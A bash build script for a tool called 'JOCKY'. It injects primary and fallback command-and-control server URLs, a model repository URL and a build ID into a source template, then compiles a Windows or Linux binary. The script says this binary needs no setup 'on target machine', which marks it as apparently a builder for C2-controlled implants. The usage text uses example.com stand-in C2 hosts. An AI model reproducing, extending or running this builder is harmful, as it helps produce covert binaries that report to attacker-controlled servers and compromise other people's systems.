#!/bin/bash
# JOCKY Production Build Wrapper
# Injects compile-time configuration from environment variables
# Usage: ./build_with_config.sh <source.jky> <output_dir> [--platform linux|windows]

set -e

if [ $# -lt 2 ]; then
    echo "Usage: $0 <source.jky> <output_dir> [--platform linux|windows]"
    echo ""
    echo "Environment Variables (required):"
    echo "  JOCKY_C2_PRIMARY       - Primary C2 server URL"
    echo "  JOCKY_C2_FALLBACK      - Fallback C2 server URL"
    echo "  JOCKY_MODEL_REPO       - Model repository base URL"
    echo "  JOCKY_BUILD_ID         - Unique build identifier"
    echo ""
    echo "Example:"
    echo "  export JOCKY_C2_PRIMARY=https://c2.example.com/api/config"
    echo "  export JOCKY_C2_FALLBACK=https://c2-backup.example.com/api/config"
    echo "  export JOCKY_MODEL_REPO=https://models.example.com/models/"
    echo "  export JOCKY_BUILD_ID=production_linux_001"
    echo "  $0 examples/research_chain_linux_production.jky build/output"
    exit 1
fi

SOURCE_FILE="$1"
OUTPUT_DIR="$2"
PLATFORM="${3:-windows}"  # Default to windows if not specified

if [ "$3" == "--platform" ] && [ -n "$4" ]; then
    PLATFORM="$4"
fi

# Validate environment variables
if [ -z "$JOCKY_C2_PRIMARY" ]; then
    echo "ERROR: JOCKY_C2_PRIMARY not set"
    exit 1
fi

if [ -z "$JOCKY_C2_FALLBACK" ]; then
    echo "ERROR: JOCKY_C2_FALLBACK not set"
    exit 1
fi

if [ -z "$JOCKY_MODEL_REPO" ]; then
    echo "ERROR: JOCKY_MODEL_REPO not set"
    exit 1
fi

if [ -z "$JOCKY_BUILD_ID" ]; then
    echo "ERROR: JOCKY_BUILD_ID not set"
    exit 1
fi

# Create temporary working directory
WORK_DIR=$(mktemp -d)
trap "rm -rf $WORK_DIR" EXIT

echo "[*] JOCKY Production Build Wrapper"
echo "[*] Source: $SOURCE_FILE"
echo "[*] Platform: $PLATFORM"
echo "[*] Build ID: $JOCKY_BUILD_ID"
echo ""

# Copy source to temp directory
cp "$SOURCE_FILE" "$WORK_DIR/source_template.jky"

echo "[*] Injecting compile-time configuration..."

# Create injected source with environment variables substituted
sed \
    -e "s|JOCKY_C2_PRIMARY_PLACEHOLDER|$JOCKY_C2_PRIMARY|g" \
    -e "s|JOCKY_C2_FALLBACK_PLACEHOLDER|$JOCKY_C2_FALLBACK|g" \
    -e "s|JOCKY_MODEL_REPO_PLACEHOLDER|$JOCKY_MODEL_REPO|g" \
    -e "s|JOCKY_BUILD_ID_PLACEHOLDER|$JOCKY_BUILD_ID|g" \
    "$WORK_DIR/source_template.jky" > "$WORK_DIR/source_injected.jky"

echo "    [+] C2 Primary: $JOCKY_C2_PRIMARY"
echo "    [+] C2 Fallback: $JOCKY_C2_FALLBACK"
echo "    [+] Model Repo: $JOCKY_MODEL_REPO"
echo "    [+] Build ID: $JOCKY_BUILD_ID"
echo ""

# Verify placeholders were replaced
if grep -q "PLACEHOLDER" "$WORK_DIR/source_injected.jky"; then
    echo "ERROR: Some placeholders were not replaced!"
    exit 1
fi

echo "[*] Configuration injection complete"
echo "[*] Compiling with injected configuration..."
echo ""

# Call the actual compile pipeline with injected source
python3 "$(dirname "$0")/compile_pipeline.py" \
    "$WORK_DIR/source_injected.jky" \
    "$OUTPUT_DIR" \
    --platform "$PLATFORM"

echo ""
echo "[+] Build complete!"
echo "[*] Binary ready with production configuration baked in"
echo "[*] No environment variables need to be set on target machine"
